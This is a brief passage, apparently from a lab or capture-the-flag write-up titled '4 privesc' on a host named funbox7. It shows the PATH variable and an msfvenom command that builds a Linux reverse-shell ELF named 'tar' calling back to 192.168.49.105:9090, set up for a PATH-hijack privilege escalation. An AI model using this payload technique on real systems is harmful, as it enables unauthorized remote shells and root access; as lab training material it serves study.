# 4 privesc

```
# update PATH
oracle@funbox7:~$ echo $PATH
/home/oracle:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

$ msfvenom -p linux/x64/shell_reverse_tcp RHOST=192.168.49.105 LPORT=9090 -f elf -o tar
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: tar
```
